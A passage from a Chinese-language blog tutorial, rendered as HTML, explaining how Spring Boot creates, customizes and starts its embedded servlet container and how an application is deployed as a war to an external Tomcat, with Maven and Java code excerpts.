class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-tomcat<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--引入其他的Servlet容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-jetty<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>Undertow</p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 引入web模块 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-tomcat<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--引入其他的Servlet容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-undertow<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h3 id="4）、嵌入式Servlet容器自动配置原理；"><a href="#4）、嵌入式Servlet容器自动配置原理；" class="headerlink" title="4）、嵌入式Servlet容器自动配置原理；"></a>4）、嵌入式Servlet容器自动配置原理；</h3><p>EmbeddedServletContainerAutoConfiguration：嵌入式的Servlet容器自动配置？</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@AutoConfigureOrder(Ordered.HIGHEST_PRECEDENCE)</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ConditionalOnWebApplication</span></span><br><span class="line"><span class="meta">@Import(BeanPostProcessorsRegistrar.class)</span></span><br><span class="line"><span class="comment">//导入BeanPostProcessorsRegistrar：Spring注解版；给容器中导入一些组件</span></span><br><span class="line"><span class="comment">//导入了EmbeddedServletContainerCustomizerBeanPostProcessor：</span></span><br><span class="line"><span class="comment">//后置处理器：bean初始化前后（创建完对象，还没赋值赋值）执行初始化工作</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EmbeddedServletContainerAutoConfiguration</span> {</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ConditionalOnClass({ Servlet.class, Tomcat.class })</span><span class="comment">//判断当前是否引入了Tomcat依赖；</span></span><br><span class="line"><span class="meta">@ConditionalOnMissingBean(value = EmbeddedServletContainerFactory.class, search = SearchStrategy.CURRENT)</span><span class="comment">//判断当前容器没有用户自己定义EmbeddedServletContainerFactory：嵌入式的Servlet容器工厂；作用：创建嵌入式的Servlet容器</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EmbeddedTomcat</span> {</span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> TomcatEmbeddedServletContainerFactory <span class="title function_">tomcatEmbeddedServletContainerFactory</span><span class="params">()</span> {</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TomcatEmbeddedServletContainerFactory</span>();</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Nested configuration if Jetty is being used.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ConditionalOnClass({ Servlet.class, Server.class, Loader.class,</span></span><br><span class="line"><span class="meta">WebAppContext.class })</span></span><br><span class="line"><span class="meta">@ConditionalOnMissingBean(value = EmbeddedServletContainerFactory.class, search = SearchStrategy.CURRENT)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EmbeddedJetty</span> {</span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> JettyEmbeddedServletContainerFactory <span class="title function_">jettyEmbeddedServletContainerFactory</span><span class="params">()</span> {</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JettyEmbeddedServletContainerFactory</span>();</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Nested configuration if Undertow is being used.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ConditionalOnClass({ Servlet.class, Undertow.class, SslClientAuthMode.class })</span></span><br><span class="line"><span class="meta">@ConditionalOnMissingBean(value = EmbeddedServletContainerFactory.class, search = SearchStrategy.CURRENT)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EmbeddedUndertow</span> {</span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> UndertowEmbeddedServletContainerFactory <span class="title function_">undertowEmbeddedServletContainerFactory</span><span class="params">()</span> {</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">UndertowEmbeddedServletContainerFactory</span>();</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>1）、EmbeddedServletContainerFactory（嵌入式Servlet容器工厂）</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">EmbeddedServletContainerFactory</span> {</span><br><span class="line"></span><br><span class="line">   <span class="comment">//获取嵌入式的Servlet容器</span></span><br><span class="line">   EmbeddedServletContainer <span class="title function_">getEmbeddedServletContainer</span><span class="params">(</span></span><br><span class="line"><span class="params">         ServletContextInitializer... initializers)</span>;</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/59173/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180302144835.png"></p><p>2）、EmbeddedServletContainer：（嵌入式的Servlet容器）</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/59173/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180302144910.png"></p><p>3）、以<strong>TomcatEmbeddedServletContainerFactory</strong>为例</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> EmbeddedServletContainer <span class="title function_">getEmbeddedServletContainer</span><span class="params">(</span></span><br><span class="line"><span class="params">      ServletContextInitializer... initializers)</span> {</span><br><span class="line">    <span class="comment">//创建一个Tomcat</span></span><br><span class="line">   <span class="type">Tomcat</span> <span class="variable">tomcat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tomcat</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//配置Tomcat的基本环节</span></span><br><span class="line">   <span class="type">File</span> <span class="variable">baseDir</span> <span class="operator">=</span> (<span class="built_in">this</span>.baseDirectory != <span class="literal">null</span> ? <span class="built_in">this</span>.baseDirectory</span><br><span class="line">         : createTempDir(<span class="string">"tomcat"</span>));</span><br><span class="line">   tomcat.setBaseDir(baseDir.getAbsolutePath());</span><br><span class="line">   <span class="type">Connector</span> <span class="variable">connector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Connector</span>(<span class="built_in">this</span>.protocol);</span><br><span class="line">   tomcat.getService().addConnector(connector);</span><br><span class="line">   customizeConnector(connector);</span><br><span class="line">   tomcat.setConnector(connector);</span><br><span class="line">   tomcat.getHost().setAutoDeploy(<span class="literal">false</span>);</span><br><span class="line">   configureEngine(tomcat.getEngine());</span><br><span class="line">   <span class="keyword">for</span> (Connector additionalConnector : <span class="built_in">this</span>.additionalTomcatConnectors) {</span><br><span class="line">      tomcat.getService().addConnector(additionalConnector);</span><br><span class="line">   }</span><br><span class="line">   prepareContext(tomcat.getHost(), initializers);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//将配置好的Tomcat传入进去，返回一个EmbeddedServletContainer；并且启动Tomcat服务器</span></span><br><span class="line">   <span class="keyword">return</span> getTomcatEmbeddedServletContainer(tomcat);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>4）、我们对嵌入式容器的配置修改是怎么生效？</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ServerProperties、EmbeddedServletContainerCustomizer</span><br></pre></td></tr></tbody></table></figure><p><strong>EmbeddedServletContainerCustomizer</strong>：定制器帮我们修改了Servlet容器的配置？</p><p>怎么修改的原理？</p><p>5）、容器中导入了<strong>EmbeddedServletContainerCustomizerBeanPostProcessor</strong></p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//初始化之前</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">postProcessBeforeInitialization</span><span class="params">(Object bean, String beanName)</span></span><br><span class="line">      <span class="keyword">throws</span> BeansException {</span><br><span class="line">    <span class="comment">//如果当前初始化的是一个ConfigurableEmbeddedServletContainer类型的组件</span></span><br><span class="line">   <span class="keyword">if</span> (bean <span class="keyword">instanceof</span> ConfigurableEmbeddedServletContainer) {</span><br><span class="line">       <span class="comment">//</span></span><br><span class="line">      postProcessBeforeInitialization((ConfigurableEmbeddedServletContainer) bean);</span><br><span class="line">   }</span><br><span class="line">   <span class="keyword">return</span> bean;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">postProcessBeforeInitialization</span><span class="params">(</span></span><br><span class="line"><span class="params">ConfigurableEmbeddedServletContainer bean)</span> {</span><br><span class="line">    <span class="comment">//获取所有的定制器，调用每一个定制器的customize方法来给Servlet容器进行属性赋值；</span></span><br><span class="line">    <span class="keyword">for</span> (EmbeddedServletContainerCustomizer customizer : getCustomizers()) {</span><br><span class="line">        customizer.customize(bean);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> Collection&lt;EmbeddedServletContainerCustomizer&gt; <span class="title function_">getCustomizers</span><span class="params">()</span> {</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.customizers == <span class="literal">null</span>) {</span><br><span class="line">        <span class="comment">// Look up does not include the parent context</span></span><br><span class="line">        <span class="built_in">this</span>.customizers = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;EmbeddedServletContainerCustomizer&gt;(</span><br><span class="line">            <span class="built_in">this</span>.beanFactory</span><br><span class="line">            <span class="comment">//从容器中获取所有这葛类型的组件：EmbeddedServletContainerCustomizer</span></span><br><span class="line">            <span class="comment">//定制Servlet容器，给容器中可以添加一个EmbeddedServletContainerCustomizer类型的组件</span></span><br><span class="line">            .getBeansOfType(EmbeddedServletContainerCustomizer.class,</span><br><span class="line">                            <span class="literal">false</span>, <span class="literal">false</span>)</span><br><span class="line">            .values());</span><br><span class="line">        Collections.sort(<span class="built_in">this</span>.customizers, AnnotationAwareOrderComparator.INSTANCE);</span><br><span class="line">        <span class="built_in">this</span>.customizers = Collections.unmodifiableList(<span class="built_in">this</span>.customizers);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.customizers;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">ServerProperties也是定制器</span><br></pre></td></tr></tbody></table></figure><p>步骤：</p><p>1）、SpringBoot根据导入的依赖情况，给容器中添加相应的EmbeddedServletContainerFactory【TomcatEmbeddedServletContainerFactory】</p><p>2）、容器中某个组件要创建对象就会惊动后置处理器；EmbeddedServletContainerCustomizerBeanPostProcessor；</p><p>只要是嵌入式的Servlet容器工厂，后置处理器就工作；</p><p>3）、后置处理器，从容器中获取所有的<strong>EmbeddedServletContainerCustomizer</strong>，调用定制器的定制方法</p><p>###5）、嵌入式Servlet容器启动原理；</p><p>什么时候创建嵌入式的Servlet容器工厂？什么时候获取嵌入式的Servlet容器并启动Tomcat；</p><p>获取嵌入式的Servlet容器工厂：</p><p>1）、SpringBoot应用启动运行run方法</p><p>2）、refreshContext(context);SpringBoot刷新IOC容器【创建IOC容器对象，并初始化容器，创建容器中的每一个组件】；如果是web应用创建<strong>AnnotationConfigEmbeddedWebApplicationContext</strong>，否则：<strong>AnnotationConfigApplicationContext</strong></p><p>3）、refresh(context);<strong>刷新刚才创建好的ioc容器；</strong></p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">refresh</span><span class="params">()</span> <span class="keyword">throws</span> BeansException, IllegalStateException {</span><br><span class="line">   <span class="keyword">synchronized</span> (<span class="built_in">this</span>.startupShutdownMonitor) {</span><br><span class="line">      <span class="comment">// Prepare this context for refreshing.</span></span><br><span class="line">      prepareRefresh();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Tell the subclass to refresh the internal bean factory.</span></span><br><span class="line">      <span class="type">ConfigurableListableBeanFactory</span> <span class="variable">beanFactory</span> <span class="operator">=</span> obtainFreshBeanFactory();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Prepare the bean factory for use in this context.</span></span><br><span class="line">      prepareBeanFactory(beanFactory);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">try</span> {</span><br><span class="line">         <span class="comment">// Allows post-processing of the bean factory in context subclasses.</span></span><br><span class="line">         postProcessBeanFactory(beanFactory);</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Invoke factory processors registered as beans in the context.</span></span><br><span class="line">         invokeBeanFactoryPostProcessors(beanFactory);</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Register bean processors that intercept bean creation.</span></span><br><span class="line">         registerBeanPostProcessors(beanFactory);</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Initialize message source for this context.</span></span><br><span class="line">         initMessageSource();</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Initialize event multicaster for this context.</span></span><br><span class="line">         initApplicationEventMulticaster();</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Initialize other special beans in specific context subclasses.</span></span><br><span class="line">         onRefresh();</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Check for listener beans and register them.</span></span><br><span class="line">         registerListeners();</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Instantiate all remaining (non-lazy-init) singletons.</span></span><br><span class="line">         finishBeanFactoryInitialization(beanFactory);</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Last step: publish corresponding event.</span></span><br><span class="line">         finishRefresh();</span><br><span class="line">      }</span><br><span class="line"></span><br><span class="line">      <span class="keyword">catch</span> (BeansException ex) {</span><br><span class="line">         <span class="keyword">if</span> (logger.isWarnEnabled()) {</span><br><span class="line">            logger.warn(<span class="string">"Exception encountered during context initialization - "</span> +</span><br><span class="line">                  <span class="string">"cancelling refresh attempt: "</span> + ex);</span><br><span class="line">         }</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Destroy already created singletons to avoid dangling resources.</span></span><br><span class="line">         destroyBeans();</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Reset 'active' flag.</span></span><br><span class="line">         cancelRefresh(ex);</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Propagate exception to caller.</span></span><br><span class="line">         <span class="keyword">throw</span> ex;</span><br><span class="line">      }</span><br><span class="line"></span><br><span class="line">      <span class="keyword">finally</span> {</span><br><span class="line">         <span class="comment">// Reset common introspection caches in Spring's core, since we</span></span><br><span class="line">         <span class="comment">// might not ever need metadata for singleton beans anymore...</span></span><br><span class="line">         resetCommonCaches();</span><br><span class="line">      }</span><br><span class="line">   }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>4）、  onRefresh(); web的ioc容器重写了onRefresh方法</p><p>5）、webioc容器会创建嵌入式的Servlet容器；<strong>createEmbeddedServletContainer</strong>();</p><p><strong>6）、获取嵌入式的Servlet容器工厂：</strong></p><p>EmbeddedServletContainerFactory containerFactory = getEmbeddedServletContainerFactory();</p><p>​    从ioc容器中获取EmbeddedServletContainerFactory 组件；<strong>TomcatEmbeddedServletContainerFactory</strong>创建对象，后置处理器一看是这个对象，就获取所有的定制器来先定制Servlet容器的相关配置；</p><p>7）、<strong>使用容器工厂获取嵌入式的Servlet容器</strong>：this.embeddedServletContainer = containerFactory      .getEmbeddedServletContainer(getSelfInitializer());</p><p>8）、嵌入式的Servlet容器创建对象并启动Servlet容器；</p><p><strong>先启动嵌入式的Servlet容器，再将ioc容器中剩下没有创建出的对象获取出来；</strong></p><p><strong>==IOC容器启动创建嵌入式的Servlet容器==</strong></p><h2 id="9、使用外置的Servlet容器"><a href="#9、使用外置的Servlet容器" class="headerlink" title="9、使用外置的Servlet容器"></a>9、使用外置的Servlet容器</h2><p>嵌入式Servlet容器：应用打成可执行的jar</p><p>​        优点：简单、便携；</p><p>​        缺点：默认不支持JSP、优化定制比较复杂（使用定制器【ServerProperties、自定义EmbeddedServletContainerCustomizer】，自己编写嵌入式Servlet容器的创建工厂【EmbeddedServletContainerFactory】）；</p><p>外置的Servlet容器：外面安装Tomcat—应用war包的方式打包；</p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>1）、必须创建一个war项目；（利用idea创建好目录结构）</p><p>2）、将嵌入式的Tomcat指定为provided；</p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-tomcat<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>3）、必须编写一个<strong>SpringBootServletInitializer</strong>的子类，并调用configure方法</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletInitializer</span> <span class="keyword">extends</span> <span class="title class_">SpringBootServletInitializer</span> {</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">protected</span> SpringApplicationBuilder <span class="title function_">configure</span><span class="params">(SpringApplicationBuilder application)</span> {</span><br><span class="line">       <span class="comment">//传入SpringBoot应用的主程序</span></span><br><span class="line">      <span class="keyword">return</span> application.sources(SpringBoot04WebJspApplication.class);</span><br><span class="line">   }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>4）、启动服务器就可以使用；</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>jar包：执行SpringBoot主类的main方法，启动ioc容器，创建嵌入式的Servlet容器；</p><p>war包：启动服务器，<strong>服务器启动SpringBoot应用</strong>【SpringBootServletInitializer】，启动ioc容器；</p><p>servlet3.0（Spring注解版）：</p><p>8.2.4 Shared libraries / runtimes pluggability：</p><p>规则：</p><p>​    1）、服务器启动（web应用启动）会创建当前web应用里面每一个jar包里面ServletContainerInitializer实例：</p><p>​    2）、ServletContainerInitializer的实现放在jar包的META-INF/services文件夹下，有一个名为javax.servlet.ServletContainerInitializer的文件，内容就是ServletContainerInitializer的实现类的全类名</p><p>​    3）、还可以使用@HandlesTypes，在应用启动的时候加载我们感兴趣的类；</p><p>流程：</p><p>1）、启动Tomcat</p><p>2）、org\springframework\spring-web\4.3.14.RELEASE\spring-web-4.3.14.RELEASE.jar!\META-INF\services\javax.servlet.ServletContainerInitializer：</p><p>Spring的web模块里面有这个文件：<strong>org.springframework.web.SpringServletContainerInitializer</strong></p><p>3）、SpringServletContainerInitializer将@HandlesTypes(WebApplicationInitializer.class)标注的所有这个类型的类都传入到onStartup方法的Set&lt;Class&lt;?&gt;&gt;；为这些WebApplicationInitializer类型的类创建实例；</p><p>4）、每一个WebApplicationInitializer都调用自己的onStartup；</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/59173/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180302221835.png"></p><p>5）、相当于我们的SpringBootServletInitializer的类会被创建对象，并执行onStartup方法</p><p>6）、SpringBootServletInitializer实例执行onStartup的时候会createRootApplicationContext；创建容器</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> WebApplicationContext <span class="title function_">createRootApplicationContext</span><span class="params">(</span></span><br><span class="line"><span class="params">      ServletContext servletContext)</span> {</span><br><span class="line">    <span class="comment">//1、创建SpringApplicationBuilder</span></span><br><span class="line">   <span class="type">SpringApplicationBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> createSpringApplicationBuilder();</span><br><span class="line">   <span 